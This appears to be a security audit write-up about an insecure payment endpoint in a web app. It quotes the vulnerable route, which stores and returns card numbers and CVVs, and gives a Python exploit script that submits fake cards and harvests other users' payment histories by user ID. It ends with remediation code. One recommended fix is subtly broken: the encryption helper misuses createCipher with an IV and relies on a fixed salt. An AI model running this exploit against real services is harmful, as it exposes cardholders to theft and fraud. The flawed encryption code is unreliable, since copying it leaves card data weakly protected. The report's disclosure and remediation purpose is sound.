# Vulnerability: Insecure Payment Processing

## 1. Vulnerability Name
**Insecure Payment Gateway with Sensitive Data Exposure**

## 2. Location in Code
- **File:** `backend/src/routes/payment.js` (Lines 8-55)
- **File:** `backend/src/models/User.js` (Lines 52-65)
- **File:** `backend/src/models/Tenant.js` (Lines 32-45)

```javascript
// No input validation or encryption
router.post('/process', auth, async (req, res) => {
    const { cardNumber, expiryDate, cvv, cardholderName, amount } = req.body;
    
    // Store sensitive payment data in plain text
    const paymentData = {
        cardNumber,
        expiryDate, 
        cvv,
        cardholderName,
        amount,
        transactionId: `TXN_${Date.now()}_${Math.floor(Math.random() * 1000)}`,
        status: 'completed'
    };
    
    // Store in user's payment history without encryption
    user.paymentHistory.push(paymentData);
    
    // Return sensitive data in response
    res.json({
        success: true,
        paymentDetails: paymentData // Exposes card details
    });
});
```

## 3. Technical Root Cause
The payment system stores and transmits sensitive financial data without encryption, lacks input validation, and exposes payment details in API responses.

**Root Causes:**
- No encryption for sensitive payment data
- Missing PCI DSS compliance measures
- Predictable transaction ID generation
- No input validation for payment fields
- Sensitive data exposure in API responses
- Cross-user payment history access

## 4. Proof of Concept Explanation
1. Submit payment with fake credit card data
2. Payment is processed without validation
3. Sensitive data stored in plain text in database
4. Payment details returned in API response
5. Access other users' payment history via user ID parameter

## 5. Exploit Script
**File:** `exploit-scripts/payment_exploit.py`

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:5000"

def exploit_payment_gateway():
    # Login
    login_data = {"email": "test@tenantguard.com", "password": "test123"}
    response = requests.post(f"{BASE_URL}/api/auth/login", json=login_data)
    
    token = response.json()["token"]
    headers = {"Authorization": f"Bearer {token}"}
    
    # Process fake payment
    payment_data = {
        "cardNumber": "1234567890123456",
        "expiryDate": "12/25",
        "cvv": "123", 
        "cardholderName": "Fake User",
        "amount": 0.01,
        "plan": "premium",
        "billingAddress": "123 Fake St"
    }
    
    payment_response = requests.post(f"{BASE_URL}/api/payment/process",
                                   headers=headers, json=payment_data)
    
    if payment_response.status_code == 200:
        result = payment_response.json()
        print("[+] Payment processed with fake card!")
        print(f"Transaction ID: {result.get('transactionId')}")
        
        # Check for exposed sensitive data
        if 'paymentDetails' in result:
            print("[!] Payment details exposed!")
            print(f"Card: {result['paymentDetails'].get('cardNumber')}")
            print(f"CVV: {result['paymentDetails'].get('cvv')}")
    
    # Access other users' payment history
    user_ids = ["507f1f77bcf86cd799439011", "507f1f77bcf86cd799439012"]
    
    for user_id in user_ids:
        params = {"userId": user_id}
        history_response = requests.get(f"{BASE_URL}/api/payment/history",
                                      headers=headers, params=params)
        
        if history_response.status_code == 200:
            history = history_response.json()
            print(f"[+] Accessed payment history for user {user_id}")
            print(f"Found {len(history.get('paymentHistory', []))} payments")
```

## 6. Impact
**Severity:** CRITICAL

**Business Impact:**
- PCI DSS compliance violations and massive fines
- Credit card fraud liability
- Customer financial data theft
- Regulatory sanctions and legal action
- Complete loss of customer trust
- Business license revocation

**Technical Impact:**
- Exposure of all customer payment data
- Credit card information theft
- Financial fraud capabilities
- Cross-user payment data access
- Unencrypted sensitive data storage

**Attack Scenarios:**
- Mass credit card data harvesting
- Financial fraud using stolen card details
- Identity theft using customer information
- Competitor access to payment analytics
- Regulatory investigation and penalties

## 7. Fix Recommendation

### Immediate Actions
1. **Remove Payment Processing**
```javascript
// Disable payment endpoints immediately
// Comment out or remove payment routes from app.js
// app.use('/api/payment', paymentRoutes);
```

2. **Implement PCI DSS Compliant Solution**
```javascript
// Use established payment processors
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);

router.post('/process', auth, async (req, res) => {
    try {
        const { amount, paymentMethodId } = req.body;
        
        // Create payment intent with Stripe
        const paymentIntent = await stripe.paymentIntents.create({
            amount: amount * 100, // Convert to cents
            currency: 'usd',
            payment_method: paymentMethodId,
            confirm: true
        });
        
        // Store only non-sensitive payment reference
        const paymentRecord = {
            userId: req.user._id,
            amount: amount,
            stripePaymentIntentId: paymentIntent.id,
            status: paymentIntent.status,
            createdAt: new Date()
        };
        
        await PaymentRecord.create(paymentRecord);
        
        res.json({
            success: true,
            paymentIntentId: paymentIntent.id,
            status: paymentIntent.status
        });
        
    } catch (error) {
        res.status(500).json({ error: 'Payment processing failed' });
    }
});
```

3. **Encrypt Existing Sensitive Data**
```javascript
const crypto = require('crypto');

const encryptSensitiveData = (data) => {
    const algorithm = 'aes-256-gcm';
    const key = crypto.scryptSync(process.env.ENCRYPTION_KEY, 'salt', 32);
    const iv = crypto.randomBytes(16);
    
    const cipher = crypto.createCipher(algorithm, key, iv);
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    return {
        encrypted,
        iv: iv.toString('hex'),
        tag: cipher.getAuthTag().toString('hex')
    };
};
```

4. **Implement Proper Authorization**
```javascript
router.get('/history', auth, async (req, res) => {
    try {
        // Only allow users to access their own payment history
        const payments = await PaymentRecord.find({ 
            userId: req.user._id 
        }).select('-sensitiveFields');
        
        res.json({ paymentHistory: payments });
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch payment history' });
    }
});
```

### Long-term Security Measures
- Integrate with PCI DSS compliant payment processors (Stripe, PayPal)
- Implement tokenization for payment methods
- Add fraud detection and prevention
- Implement proper audit logging
- Regular security assessments and penetration testing
- Staff training on PCI DSS requirements

### Data Protection Strategy
```javascript
// Payment data model with proper security
const PaymentRecordSchema = new mongoose.Schema({
    userId: { type: ObjectId, required: true, ref: 'User' },
    amount: { type: Number, required: true },
    currency: { type: String, default: 'USD' },
    paymentProcessorId: { type: String, required: true }, // Stripe/PayPal ID
    status: { type: String, required: true },
    // Never store: cardNumber, cvv, expiryDate
    lastFourDigits: { type: String }, // Only last 4 digits
    cardBrand: { type: String }, // Visa, MasterCard, etc.
    createdAt: { type: Date, default: Date.now }
});
```

### Compliance Requirements
- Achieve PCI DSS Level 1 compliance
- Implement data retention policies
- Regular vulnerability scanning
- Quarterly security assessments
- Annual penetration testing
- Staff security awareness training